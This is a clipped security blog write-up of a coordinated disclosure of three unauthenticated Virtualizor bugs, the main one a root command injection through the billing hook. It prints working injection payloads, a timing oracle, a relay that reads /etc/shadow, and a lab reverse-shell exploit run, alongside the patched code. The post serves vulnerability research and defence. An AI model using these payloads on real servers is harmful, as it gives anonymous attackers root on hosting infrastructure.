---
title: "Virtualizor: The Login Parameter That Skips the Login - Chocapikk's Cybersecurity Blog"
source: https://chocapikk.com/posts/2026/virtualizor-billing-hook-unauthenticated-root-rce/
source_host: chocapikk.com
clip_date: 2026-09-25T19:22:33+08:00
trace_id: 5307c841-20c9-4439-bbd3-abe02d9d8ed5
content_hash: dd084de9e0ea6e14fba477e7c5cefd0dc888c451676a9deb7ab17508942c2728
status: synced
tags:
  - 漏洞分析
  - 认证绕过
series: null
feed_source: Chocapikk·漏洞/Android RE
ai_summary: Virtualizor 3.2.9 patch 7 的预认证守卫只放过 `act=login`，导致三个未认证漏洞，其中 billing hook 注入可让匿名攻击者以 root 执行命令。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3e675244-d011-8124-b571-cf998ddda7fa
ioc:
  cves:
    - CVE-2026-43641
    - CVE-2026-43642
    - CVE-2026-43643
  cwes:
    - CWE-502
    - CWE-639
    - CWE-78
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> Virtualizor 3.2.9 patch 7 的预认证守卫只放过 `act=login`，导致三个未认证漏洞，其中 billing hook 注入可让匿名攻击者以 root 执行命令。
> 
> - **根因：** `enduser/admin.php` 预认证块仅在 `act != 'login'` 时重定向，`act=login` 使守卫失效，直接落入 `from_billing_module` 分支，无需会话、密钥或 slave 凭据。
> - **CVE-2026-43641（旗舰）：** `$uid` 未经 intval 就拼进 `billing_unsuspend()` 的 `vexec()`→`proc_open`，载荷 `2; id > /tmp/x ; #` 注释掉尾部 `&` 后以 root 前台执行；管理面板 index.php 由以 root 运行的 php-fpm 池 virt9178 提供，故为 `uid=0`。
> - **参数化查询为何没用：** MySQL 比较字符串与 INT 列时取前导数字 `2`，`get_users_by_uid()` 用输入字符串作键存行，资格闸门读到的是用户 2 的真实属性，恶意串原样进入 shell。
> - **前置条件与探测：** 需存在 type=2、in-house billing、已暂停且 `cur_bal >= usage` 的账号；用 `sleep 3` 载荷可按响应耗时定位可用 uid，响应码与正文无差异，扫描本身不破坏数据。
> - **另两洞与修复：** CVE-2026-43642 为未认证原生 `unserialize()`（现成代码无可用 gadget），CVE-2026-43643 可未认证清零任意租户余额；patch 9/3.3.0 通过 `apicall_validate()` 认证入口、`allowed_classes=>false`、并在 `vexec` 前 `(int)` 强转修复，patch 7/8 仍可被匿名 root 利用。

> **Original disclosure:** This research was coordinated and first published by VulnCheck: [virtualizor-billing-hook-unauthenticated-root-rce](https://www.vulncheck.com/blog/virtualizor-billing-hook-unauthenticated-root-rce). This post is my technical write-up.

Today VulnCheck’s Initial Access Intelligence team is detailing an unauthenticated remote root code execution in [Virtualizor](https://www.virtualizor.com/), Softaculous’ commercial VPS and hypervisor control panel. It provisions and manages KVM/OpenVZ/LXC guests, so its web layer runs as root, which is exactly why a web bug here ends at `uid=0` instead of `www-data`. It is being disclosed in accordance with VulnCheck’s [coordinated vulnerability disclosure policy](https://vulncheck.com/vulnerability-disclosure-policy); the three CVEs were allocated through the VulnCheck CNA. The audit turned up three unauthenticated bugs behind one mis-scoped guard: an OS command injection to root (the flagship), a PHP object injection, and a cross-tenant balance write. Everything below is confirmed on 3.2.9 patch 7, the build we audited, running the vendor’s real ionCube-encoded panel.

The redirect that guards the admin panel fires for every action except one. That one is `login`.

## Recovering the source

The panel PHP is ionCube-encoded, so none of this came from reading source off disk. The code below was decoded from the vendor’s real encoded build. The package that ships this code is a straight unauthenticated download, `http://api.virtualizor.com/updates.php?give=3.2.9.7`, a 91 MB ZIP with no license required, so the audited build is the build any operator runs.

## The one mis-scoped guard

`enduser/index.php` routes by TCP port: 80/443/4082/4083 go to the client panel, 4084/4085 to `enduser/admin.php`, the internet-facing management surface for the node. Before it authenticates you, the admin panel walks a pre-auth block that answers the handful of things a slave node or a billing module is allowed to do before anyone logs in, and otherwise bounces you to the login page. Decoded, because this control flow is the whole bug:

```php
if (empty($SESS['is_admin'])) {
    // ... slave / API callbacks, each exit()s ...
    else {
        if (!empty($SESS['uid'])) exit('HACKING ATTEMPT');
        if (optGET('act') != 'login') {           // the guard
            redirect('act=login...'); exit();
        }
    }
    if (optGET('from_billing_module')) {           // reached when act=login
        update_data_for_billing_modules(optGET('from_billing_module'));
        exit();
    }
}
```

When `act == 'login'`, the guard’s inequality is false, so control falls through the redirect and lands on the `from_billing_module` check with no session, no key, no slave credentials. `act=login`, the one value a login page should handle, is precisely the value that skips the guard.

## The three findings

| CVE | Bug | CWE | Sink | Result |
| :--- | :--- | :--- | :--- | :--- |
| [CVE-2026-43641](https://nvd.nist.gov/vuln/detail/CVE-2026-43641) | Unauthenticated OS command injection to root | CWE-78 (+306) | `billing_unsuspend()` `vexec` -> `proc_open`, uid spliced in | `uid=0(root)` |
| [CVE-2026-43642](https://nvd.nist.gov/vuln/detail/CVE-2026-43642) | Unauthenticated PHP object injection | CWE-502 (+306) | `_unserialize($_POST['billing_data'])`, native `unserialize` | untrusted deserialization (no stock gadget) |
| [CVE-2026-43643](https://nvd.nist.gov/vuln/detail/CVE-2026-43643) | Unauthenticated cross-tenant balance write | CWE-639 (+306) | `UPDATE users SET cur_bal WHERE uid=:uid` | `777.00 -> 0.00`, no auth |

All three enter through the same unauthenticated door. CVE-2026-43641 is the flagship: remote root.

## CVE-2026-43641: from a billing callback to a root shell

```php
// main/functions.php
function update_data_for_billing_modules($billing_module_name) {
    $billing_data = _unserialize($_POST['billing_data']);   // CVE-2026-43642 lives here
    if ($billing_module_name == 'whmcs') {                  // CVE-2026-43643 lives here
        if (!empty($billing_data) && is_array($billing_data))
            makequery("UPDATE users SET cur_bal = :balance WHERE uid = :uid",
                      [':balance' => (float)$billing_data['balance'], ':uid' => $billing_data['uid']]);
    }
    $uid  = $billing_data['uid'];                           // attacker-controlled, no intval
    $user = get_users_by_uid([$uid]);
    // gate: inhouse_billing on && $user[$uid]['type']==2 && $user[$uid]['inhouse_billing']
    billing_try_unsuspend($uid);
}

function billing_unsuspend($uid) {                          // reached via billing_try_unsuspend()
    vexec($php . ' ' . $path . '/scripts/billing_unsuspend.php ' . $uid . ' > ' . $log . $uid . '.log 2>&1 &');
    // vexec() -> proc_open($cmd) == /bin/sh -c  =>  command injection, as root
}
```

`$uid` comes straight out of the unserialized body and is concatenated into the command string. The payload:

```plaintext
uid = "2; id > /tmp/x ; #"
billing_data = a:1:{s:3:"uid";s:18:"2; id > /tmp/x ; #";}
```

The `#` comments out the source’s trailing `> .../<uid>.log 2>&1 &`, so `id` runs in the foreground. Verified on the lab: `/tmp/x` reads `uid=0(root) gid=0(root) groups=0(root)`.

### Why the parameterized queries do not save it

Every SQL statement in this path is parameterized, `WHERE uid = :uid` with `:uid` bound. That kills SQL injection here, and it is real. But look at how the eligibility gate reads the user:

```php
function get_users_by_uid($uids) {
    foreach ($uids as $uid) {
        $res = makequery("SELECT * FROM users WHERE uid = :uid", [':uid' => $uid]);  // bound
        if (vsql_num_rows($res) > 0) $users[$uid] = vsql_fetch_assoc($res);          // keyed by INPUT
    }
    return $users;
}
```

The bound value is the string `"2; id > /tmp/x ; #"`. MySQL, comparing a string against an `INT` column, casts it to a number by taking the leading numeric part: `2`. So user 2’s row comes back, and `get_users_by_uid` stores it under the input-string key. The gate then reads `$user["2; id > /tmp/x ; #"]['type']`, which is user 2’s real `type`, passes, and `$uid` sails on into `proc_open` with the payload intact. The parameterization is real; it just is not a boundary, because the same value is also used in a shell, and MySQL politely casts the shell payload back to the integer the query wanted.

### The precondition, stated honestly

This is not precondition-free. `billing_try_unsuspend` only reaches the exec for a user that is type 2, in-house-billing, currently suspended, with `cur_bal >= usage`: in practice a manually-suspended, paid-up account (a fresh 0-usage suspended user satisfies `0 >= 0`). It is server state the attacker does not create, but it is state that exists on any install that uses the in-house billing, because suspended accounts are the whole point of billing. And no enumeration endpoint is needed, because the endpoint is its own oracle.

### A non-destructive timing oracle

Because the `#` comments out the trailing `&`, the injected command runs in the foreground and `vexec` waits on `proc_open`. So `uid = "<N>; sleep 3 ; #"` delays the HTTP response by three seconds only when `<N>` is an eligible suspended user; for everyone else the response is instant. The status code and body are identical either way, so the timing is the whole signal:

```plaintext
uid=1   200  0.14s
uid=2   200  3.15s   <-- eligible
uid=3   200  0.14s
```

Spray `uid=1..N` with a sleep payload, watch for the one that hangs, then exploit only that uid. Nothing is dropped on anyone during the scan.

### The environmental catch: sql_mode

The `uid` cast that saves the SELECT is a warning in MySQL’s non-strict mode but an error in strict mode, and `billing_try_unsuspend` also runs an `UPDATE ... WHERE u.uid = :uid` recalc, which in strict mode raises `1292 Truncated incorrect DECIMAL value` and `makequery` calls `exit()`, killing the chain before the shell. So CVE-2026-43641 needs the DB in non-strict mode. Is it? I did not assume: I downloaded the current EMPS (`emps.php?latest=1&arch=64`, the stack the installer fetches) and read the bundled `mysqld`, whose build paths are `/emps/mysql-5.5.62/...`. It ships MySQL 5.5.62, whose default `sql_mode` is empty, and the EMPS `my.cnf` does not set it, so production Virtualizor is non-strict by default and CVE-2026-43641 works out of the box. The MariaDB 10.5 lab defaults to strict, which is stricter than production, so the lab pins `sql_mode=''` to match a real box.

### Why it is root, and the trap that would lose it

`id` is a proof; a shell is the point, and EMPS splits PHP across php-fpm pools with different users. From the bundled `nginx.conf` and `php-fpm.conf`: the admin panel’s `index.php` (ports 4084/4085) is served by pool `virt9178` running as root, the client panel’s `index.php` by pool `virt9179` as `emps`, and, crucially, any other `.php` file (the `location ~ \.php$` block, all ports) by pool `virt9180`, also as `emps`. That is the config-level proof that CVE-2026-43641 is root: the injection rides the admin `index.php` request, so `proc_open()` runs in pool 9178, as root. It is also a trap: the obvious move, dropping a `vshell.php` and hitting it, would be served by pool 9180 and run as `emps`, not root. So the exploit does not drop a PHP webshell. It keeps every command in the root pool by relaying through the `from_billing_module` injection, writing each command’s output to a random static file in the webroot that nginx serves directly, no php-fpm:

```plaintext
uid = "N; { <cmd> ; } > /usr/local/virtualizor/enduser/<rand>.txt 2>&1; chmod 644 <rand>.txt; #"
GET /<rand>.txt     ->  <cmd> output, produced as root
```

Verified on the lab: in-band `id` -> `uid=0(root)`, `head -1 /etc/shadow` -> `root:*:...` as root, and the webroot is left clean.

## CVE-2026-43642: the unserialize() you never write

Before CVE-2026-43641 ever touches `$uid`, the handler runs `unserialize()` on the attacker’s body:

```php
function _unserialize($str) { $var = unserialize($str); ... }   // no allowed_classes
$billing_data = _unserialize($_POST['billing_data']);           // unauthenticated
```

That is a native `unserialize()` of attacker-controlled input, objects allowed, against a root process: the textbook PHP object-injection primitive (CWE-502). To be exact about how far it goes: the primitive is real and unauthenticated, but at this point in the bootstrap the only declared classes are `kernel`, the per-hypervisor kernels, `cluster`, `ArrayToXML` and `PDO`, none of which have `__wakeup` / `__destruct`, and there is no autoloader, so a working POP chain is not demonstrated in the stock code. The only `__destruct` methods in the whole tree (`phpmailer::smtpClose`, `tcpdf::_destroy`) are not loaded here and are benign. It is reported anyway, because untrusted deserialization is the vulnerability, and the set of loadable gadgets changes the moment an addon, a plugin, or a future version pulls another class into that request. The fix is one argument: `unserialize($str, ['allowed_classes' => false])`.

## CVE-2026-43643: zero out any account’s balance, unauthenticated

The `whmcs` branch of the same handler is a clean, `sql_mode` -independent data-tampering bug:

```php
if ($billing_module_name == 'whmcs' && is_array($billing_data))
    makequery("UPDATE users SET cur_bal = :balance WHERE uid = :uid",
              [':balance' => (float)$billing_data['balance'], ':uid' => $billing_data['uid']]);
```

`uid` is an attacker-chosen integer with no authentication and no ownership check. The value is float-cast, so an attacker can set any tenant’s `cur_bal` to any amount without credentials: zero it, or inflate it past `usage` to feed the very unsuspend state machine CVE-2026-43641 rides. Verified: a user seeded with `cur_bal = 777.00` reads `0.00` after one unauthenticated request.

## Initial Access exploit

VulnCheck’s Initial Access Intelligence team turned finding 1 into a self-contained [go-exploit](https://github.com/vulncheck-oss/go-exploit) module. It fingerprints the Virtualizor admin panel, runs the timing oracle over a uid range to find an eligible suspended account by itself, then fires the billing-hook injection: `-command` relays a single command’s output through the static-file drop, and the reverse-shell modes background the payload through the same root-pool request. On the lab it lands a root shell with no credentials and no uid supplied:

```plaintext
chocapikk@pwntoaster:~/feed/cve-2026-43641$ ./build/cve-2026-43641_linux-amd64 -v -e -rhost 192.168.48.2 -rport 4085 -uid-range 1-4 -c2 SimpleShellServer -lhost 192.168.48.3 -lport 4462
time=2026-08-24T11:29:59.223Z level=STATUS msg="Starting listener on 192.168.48.3:4462"
time=2026-08-24T11:29:59.224Z level=STATUS msg="Validating Softaculous Virtualizor target" host=192.168.48.2 port=4085
time=2026-08-24T11:29:59.314Z level=SUCCESS msg="Target verification succeeded!" host=192.168.48.2 port=4085 verified=true
time=2026-08-24T11:29:59.314Z level=STATUS msg="Auto-detecting an exploitable account over uid 1..4 (timing oracle)"
time=2026-08-24T11:30:02.477Z level=SUCCESS msg="uid 2 is exploitable (3.1s hang)"
time=2026-08-24T11:30:02.477Z level=STATUS msg="Exploiting through uid 2 (admin index.php runs as root)"
time=2026-08-24T11:30:02.573Z level=SUCCESS msg="Caught new shell from 192.168.48.2:57782"
time=2026-08-24T11:30:02.574Z level=STATUS msg="Active shell from 192.168.48.2:57782"
id
uid=0(root) gid=0(root) groups=0(root)
time=2026-08-24T11:30:03.565Z level=SUCCESS msg="Exploit successfully completed" exploited=true
hostname
43bc770894a8
exit
```

## Fix

Softaculous patched all three in 3.2.9 patch 9 (2026-09-01), and the fix carries into 3.3.0 (2026-09-09), the current build. Patch 7, the build audited above, and patch 8 are both still vulnerable: the billing hook is the same handler in both. There is no commit to link, the panel is closed and ionCube-encoded, so the patched code below was decoded the same way as the vulnerable code.

The fix has two layers: the shared entry is authenticated now, and each sink is hardened on its own.

**The entry.** `enduser/admin.php` no longer dispatches the hook on `act=login` alone. The block runs only after `apicall_validate()` has returned a validated call:

```php
// 3.2.9 patch 7: reached with act=login, no credentials
if (optGET('from_billing_module')) {
    update_data_for_billing_modules(optGET('from_billing_module'));
    exit();
}
// 3.2.9 patch 9 / 3.3.0: $temp = apicall_validate() earlier in the pre-auth block
if (!empty($temp) && optGET('from_billing_module')) {
    update_data_for_billing_modules(optGET('from_billing_module'));
    exit();
}
```

`apicall_validate()` returns false unless the request carries a valid `apikey` (an HMAC of the server’s secret `pass`) or valid admin API credentials, so an anonymous request never reaches `update_data_for_billing_modules()`. That closes the mis-scoped guard this whole post is about, and it is what takes “unauthenticated” off all three findings at once.

**The sinks.** `update_data_for_billing_modules()` was rewritten too:

```php
// 3.2.9 patch 7
$billing_data = _unserialize($_POST['billing_data']);            // native unserialize(), objects allowed
if ($billing_module_name == 'whmcs' && is_array($billing_data))
    makequery("UPDATE users SET cur_bal = :balance WHERE uid = :uid",
              [':balance' => (float)$billing_data['balance'], ':uid' => $billing_data['uid']]);
$uid = $billing_data['uid'];                                     // no cast, straight to vexec()

// 3.2.9 patch 9 / 3.3.0
$billing_data = unserialize(optpost('billing_data'), ['allowed_classes' => false]);
if ($billing_module_name == 'whmcs' && !empty($billing_data) && is_array($billing_data)) {
    $ures = makequery('SELECT uid, email FROM users WHERE email = :email',
                      [':email' => $billing_data['email']]);
    if (vsql_num_rows($ures) < 1) return false;                 // unknown email rejected
    $our_uid = vsql_fetch_assoc($ures);
    if ((int)$billing_data['uid'] != (int)$our_uid['uid']) return false;   // uid must own that email
    makequery("UPDATE users SET cur_bal = :balance WHERE uid = :uid",
              [':balance' => (float)$billing_data['balance'], ':uid' => $billing_data['uid']]);
}
$uid = (int)$billing_data['uid'];                               // cast before it reaches vexec()
```

CVE-2026-43641, the root shell, is closed by one cast. `$uid` becomes `(int)$billing_data['uid']` before it reaches `get_users_by_uid()` and `billing_try_unsuspend()`, so `2; id #` collapses to the integer `2` and `billing_unsuspend()` splices a number, not a command, into the string it hands `vexec()`. The `vexec()` line itself is untouched: the fix is that it can no longer be fed anything but a number.

CVE-2026-43642, the object injection, gets the minimal right fix: the native `_unserialize()` is replaced by `unserialize(..., ['allowed_classes' => false])`, so a forged `billing_data` instantiates no PHP objects and cannot carry a POP gadget.

CVE-2026-43643, the balance write, is gated twice now. The request has to pass `apicall_validate()` to get here at all, and the `whmcs` branch rejects an email that does not exist and refuses to write unless the submitted `uid` is that email’s real `uid`. The unauthenticated arbitrary write is gone. What is left is an authenticated, ownership-checked update, the billing integration doing its job, so this is the thinnest of the three fixes but no longer a vulnerability.

## Takeaways

Parameterized queries are a defense against SQL injection, not a general-purpose sanitizer, and the moment the same value is also handed to a shell, the database’s helpful string-to-integer cast becomes the attacker’s friend. A guard is only as good as its scope: the redirect here protected the whole admin surface, except for the one `act` value it special-cased, and that value was `login`. Operators running Virtualizor should update to 3.2.9 patch 9 or 3.3.0, which authenticates the billing hook; treat any build up to and including 3.2.9 patch 8 as remotely root-executable by an anonymous client, and keep the admin panel ports (4084/4085) off the public internet or behind an allowlist regardless.

## Disclosure timeline

| Date | Event |
| :--- | :--- |
| 2026-08-22 | Reported the three issues in Virtualizor 3.2.9 patch 7 to VulnCheck and requested CVE IDs. |
| 2026-08-26 | VulnCheck opened coordinated disclosure with Softaculous; [CVE-2026-43641](https://nvd.nist.gov/vuln/detail/CVE-2026-43641), [CVE-2026-43642](https://nvd.nist.gov/vuln/detail/CVE-2026-43642) and [CVE-2026-43643](https://nvd.nist.gov/vuln/detail/CVE-2026-43643) were assigned, with a 120-day disclosure deadline of 2026-12-24. |
| 2026-09-01 | Softaculous released 3.2.9 patch 9 with the fixes; 3.3.0 (current) is also fixed. |
| 2026-09-17 | The vendor requested a re-test of the latest build. |
| 2026-09-20 | Re-tested from the decoded source and confirmed all three fixed in patch 9 and 3.3.0; patch 7 (the reported build) and patch 8 remain vulnerable. |
| 2026-09-22 | VulnCheck’s disclosure. |
| 2026-09-25 | This technical write-up published on chocapikk.com. |

**Further reading:** For another VulnCheck Initial Access Intelligence deep-dive, read [FileRun: Four More Ways to Run Your Files](https://vulncheck.com/blog/filerun-delegated-admin-sql-to-object-injection-rce).

## About VulnCheck

VulnCheck empowers organizations to transcend the challenges of vulnerability prioritization. Our suite of solutions provides product managers, PSIRT teams, and threat hunters with the tools required for accelerated, high-precision operations and infinite efficiency.

Recognizing the industry-wide necessity for superior data velocity and accuracy, we deliver high-fidelity insights to the market. We remain committed to surfacing critical intelligence on vulnerability exploitation and emerging trends, leveraging our unique dataset to support the practitioner community.

To deepen your understanding of these threats, [VulnCheck Exploit & Vulnerability Intelligence](https://vulncheck.com/product/exploit-intelligence) provides comprehensive coverage of global threat actors. Register for a demo to explore our intelligence today.
